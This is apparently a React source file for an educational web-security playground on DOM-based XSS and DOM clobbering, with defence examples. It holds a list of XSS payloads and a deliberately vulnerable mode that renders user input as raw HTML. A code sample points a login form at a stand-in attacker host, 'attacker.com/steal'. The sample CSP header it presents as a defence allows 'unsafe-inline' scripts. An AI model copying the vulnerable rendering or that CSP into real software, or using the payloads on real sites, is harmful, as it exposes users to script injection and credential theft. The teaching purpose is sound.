'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Bug, AlertTriangle, Shield, Eye, EyeOff, Copy, Check } from 'lucide-react'

export default function DOMAttackPlayground() {
  const [activeTab, setActiveTab] = useState('xss')
  const [xssInput, setXssInput] = useState('')
  const [xssOutput, setXssOutput] = useState('')
  const [xssMode, setXssMode] = useState<'vulnerable' | 'safe'>('vulnerable')
  const [clobberingInput, setClobberingInput] = useState('')
  const [clobberingOutput, setClobberingOutput] = useState('')
  const [copied, setCopied] = useState(false)

  // DOM-Based XSS Demo
  const handleXSSAttack = () => {
    if (xssMode === 'vulnerable') {
      // Vulnerable: Direct innerHTML usage
      setXssOutput(xssInput)
    } else {
      // Safe: textContent usage
      const safeDiv = document.createElement('div')
      safeDiv.textContent = xssInput
      setXssOutput(safeDiv.innerHTML)
    }
  }

  // DOM Clobbering Demo
  const handleClobbering = () => {
    if (clobberingInput.includes('<form id="login">')) {
      setClobberingOutput('⚠️ DOM Clobbering detected! The login form has been overridden by attacker input.')
    } else {
      setClobberingOutput('✅ No DOM clobbering detected.')
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const xssPayloads = [
    '<img src=x onerror=alert(1)>',
    '<script>alert("XSS")</script>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select onfocus=alert(1) autofocus>'
  ]

  const clobberingPayloads = [
    '<form id="login"><input id="username" name="username"></form>',
    '<img name="login" src="x">',
    '<object id="login"></object>',
    '<embed id="login" src="x">'
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-red-500 rounded-lg">
              <Bug className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">DOM-Based Attack Playground</h1>
              <p className="text-slate-600">Learn how attackers manipulate the DOM to compromise your frontend</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription className="text-sm">
              This is a safe, sandboxed environment for learning. All attacks are contained within this page.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 h-auto">
            <TabsTrigger value="xss" className="text-xs sm:text-sm">DOM-Based XSS</TabsTrigger>
            <TabsTrigger value="clobbering" className="text-xs sm:text-sm">DOM Clobbering</TabsTrigger>
            <TabsTrigger value="defenses" className="text-xs sm:text-sm">Defense Techniques</TabsTrigger>
          </TabsList>

          {/* DOM-Based XSS Tab */}
          <TabsContent value="xss" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Bug className="w-5 h-5" />
                  <span>DOM-Based XSS Attack</span>
                </CardTitle>
                <CardDescription>
                  Inject malicious scripts through URL parameters, hash fragments, or user input that gets processed by client-side JavaScript
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Mode Selection */}
                <div className="flex items-center space-x-4">
                  <label className="text-sm font-medium">Security Mode:</label>
                  <div className="flex space-x-2">
                    <Button
                      variant={xssMode === 'vulnerable' ? 'destructive' : 'outline'}
                      size="sm"
                      onClick={() => setXssMode('vulnerable')}
                    >
                      <EyeOff className="w-4 h-4 mr-1" />
                      Vulnerable (innerHTML)
                    </Button>
                    <Button
                      variant={xssMode === 'safe' ? 'default' : 'outline'}
                      size="sm"
                      onClick={() => setXssMode('safe')}
                    >
                      <Shield className="w-4 h-4 mr-1" />
                      Safe (textContent)
                    </Button>
                  </div>
                </div>

                {/* Input Section */}
                <div className="space-y-2">
                  <label className="text-sm font-medium">Attack Input:</label>
                  <textarea
                    value={xssInput}
                    onChange={(e) => setXssInput(e.target.value)}
                    placeholder="Enter your XSS payload here..."
                    className="w-full p-3 border border-slate-300 rounded-lg font-mono text-sm"
                    rows={3}
                  />
                </div>

                {/* Quick Payloads */}
                <div className="space-y-2">
                  <label className="text-sm font-medium">Quick Payloads:</label>
                  <div className="flex flex-wrap gap-2">
                    {xssPayloads.map((payload, index) => (
                      <Button
                        key={index}
                        variant="outline"
                        size="sm"
                        onClick={() => setXssInput(payload)}
                        className="text-xs font-mono"
                      >
                        {payload.length > 20 ? payload.substring(0, 20) + '...' : payload}
                      </Button>
                    ))}
                  </div>
                </div>

                {/* Attack Button */}
                <Button onClick={handleXSSAttack} className="w-full">
                  {xssMode === 'vulnerable' ? '🚨 Execute Attack' : '🛡️ Test Safe Rendering'}
                </Button>

                {/* Output Display */}
                {xssOutput && (
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Output:</label>
                    <div 
                      className="p-4 border border-slate-300 rounded-lg bg-white"
                      dangerouslySetInnerHTML={{ __html: xssOutput }}
                    />
                    <div className="flex items-center space-x-2">
                      <Badge variant={xssMode === 'vulnerable' ? 'destructive' : 'default'}>
                        {xssMode === 'vulnerable' ? 'Vulnerable' : 'Safe'}
                      </Badge>
                      <span className="text-sm text-slate-600">
                        {xssMode === 'vulnerable' 
                          ? 'Using innerHTML - DANGEROUS!' 
                          : 'Using textContent - SAFE'
                        }
                      </span>
                    </div>
                  </div>
                )}

                {/* Code Examples */}
                <div className="space-y-4">
                  <div>
                    <h4 className="font-semibold mb-2">❌ Vulnerable Code:</h4>
                    <Code className="block p-3 bg-red-50 border border-red-200 rounded text-sm">
{`// NEVER DO THIS!
element.innerHTML = userInput;

// Attackers can inject:
userInput = '<img src=x onerror=alert("Hacked!")>';`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">✅ Safe Code:</h4>
                    <Code className="block p-3 bg-green-50 border border-green-200 rounded text-sm">
{`// ALWAYS DO THIS!
element.textContent = userInput;

// Or use DOMPurify for HTML:
element.innerHTML = DOMPurify.sanitize(userInput);`}
                    </Code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* DOM Clobbering Tab */}
          <TabsContent value="clobbering" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Bug className="w-5 h-5" />
                  <span>DOM Clobbering Attack</span>
                </CardTitle>
                <CardDescription>
                  Override JavaScript variables and DOM references by injecting HTML elements with conflicting IDs/names
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Input Section */}
                <div className="space-y-2">
                  <label className="text-sm font-medium">HTML Injection:</label>
                  <textarea
                    value={clobberingInput}
                    onChange={(e) => setClobberingInput(e.target.value)}
                    placeholder="Inject HTML elements to clobber DOM references..."
                    className="w-full p-3 border border-slate-300 rounded-lg font-mono text-sm"
                    rows={3}
                  />
                </div>

                {/* Quick Payloads */}
                <div className="space-y-2">
                  <label className="text-sm font-medium">Clobbering Payloads:</label>
                  <div className="flex flex-wrap gap-2">
                    {clobberingPayloads.map((payload, index) => (
                      <Button
                        key={index}
                        variant="outline"
                        size="sm"
                        onClick={() => setClobberingInput(payload)}
                        className="text-xs font-mono"
                      >
                        {payload}
                      </Button>
                    ))}
                  </div>
                </div>

                {/* Test Button */}
                <Button onClick={handleClobbering} className="w-full">
                  🧪 Test Clobbering
                </Button>

                {/* Output */}
                {clobberingOutput && (
                  <div className="p-4 border border-slate-300 rounded-lg bg-white">
                    <p className="text-sm">{clobberingOutput}</p>
                  </div>
                )}

                {/* Code Examples */}
                <div className="space-y-4">
                  <div>
                    <h4 className="font-semibold mb-2">❌ Vulnerable Code:</h4>
                    <Code className="block p-3 bg-red-50 border border-red-200 rounded text-sm">
{`// VULNERABLE - trusts DOM references
const loginForm = document.getElementById('login');
if (loginForm) {
  // Attacker can inject <form id="login"> to hijack this
  loginForm.action = 'https://attacker.com/steal';
}`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">✅ Safe Code:</h4>
                    <Code className="block p-3 bg-green-50 border border-green-200 rounded text-sm">
{`// SAFE - validates DOM references
const loginForm = document.getElementById('login');
if (loginForm && loginForm.tagName === 'FORM' && 
    !loginForm.hasAttribute('data-clobbered')) {
  loginForm.action = '/secure-login';
}`}
                    </Code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Defense Techniques Tab */}
          <TabsContent value="defenses" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Input Sanitization</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div>
                    <h4 className="font-semibold mb-2">DOMPurify Library</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean;`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Manual Escaping</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}`}
                    </Code>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Content Security Policy</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div>
                    <h4 className="font-semibold mb-2">CSP Headers</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  object-src 'none';`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Meta Tag CSP</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">`}
                    </Code>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>DOM Validation</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div>
                    <h4 className="font-semibold mb-2">Safe DOM Access</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`function safeGetElement(id) {
  const el = document.getElementById(id);
  return el && el.tagName === 'FORM' ? el : null;
}`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">URL Validation</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return parsed.origin === window.location.origin;
  } catch {
    return false;
  }
}`}
                    </Code>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Modern Frameworks</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div>
                    <h4 className="font-semibold mb-2">React Auto-escaping</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`// React automatically escapes
const userInput = '<script>alert(1)</script>';
return <div>{userInput}</div>; // Safe!`}
                    </Code>
                  </div>
                  <div>
                    <h4 className="font-semibold mb-2">Vue.js Protection</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`// Vue escapes by default
<template>
  <div>{{ userInput }}</div> <!-- Safe -->
  <div v-html="trustedHtml"></div> <!-- Use carefully -->
</template>`}
                    </Code>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Best Practices Summary */}
            <Card className="mt-6">
              <CardHeader>
                <CardTitle>🛡️ Security Best Practices Checklist</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <h4 className="font-semibold">✅ Always Do:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>• Use textContent instead of innerHTML</li>
                      <li>• Validate and sanitize all user input</li>
                      <li>• Implement Content Security Policy</li>
                      <li>• Use framework auto-escaping features</li>
                      <li>• Validate DOM references before use</li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-semibold">❌ Never Do:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>• Directly inject user input into innerHTML</li>
                      <li>• Trust URL parameters without validation</li>
                      <li>• Use eval() with user input</li>
                      <li>• Ignore CSP warnings</li>
                      <li>• Skip input validation on client-side</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}